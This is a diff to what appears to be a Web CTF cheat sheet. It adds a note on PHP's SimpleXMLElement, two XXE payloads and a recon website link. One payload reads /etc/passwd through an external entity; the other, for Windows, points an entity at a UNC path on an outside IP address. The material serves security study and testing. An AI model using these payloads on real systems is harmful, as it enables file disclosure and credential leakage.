@@ -1851,6 +1851,8 @@ https://github.com/cujanovic/SSRF-Testing
 
 - `libxml2.9.0`以後，預設不解析外部實體
 - `simplexml_load_file()`舊版本中預設解析實體，但新版要指定第三個參數`LIBXML_NOENT`
+- `SimpleXMLElement` is a class in PHP
+    - http://php.net/manual/en/class.simplexmlelement.php
 
 ```xml
 <!DOCTYPE kaibro[
@@ -1862,6 +1864,15 @@ https://github.com/cujanovic/SSRF-Testing
 ```xml
 <!DOCTYPE kaibro[
     <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>
+```
+
+### XXE on Windows
+
+```xml
+<!DOCTYPE kaibro[
+    <!ENTITY xxe SYSTEM "\\12.34.56.78">
 ]>
 <root>&xxe;</root>
 ```
@@ -2276,6 +2287,8 @@ state[i] = state[i-3] + state[i-31]`
 - https://censys.io
 
 - https://crt.sh/
+
+- http://webscan.cc/
 
 - https://x.threatbook.cn/
 
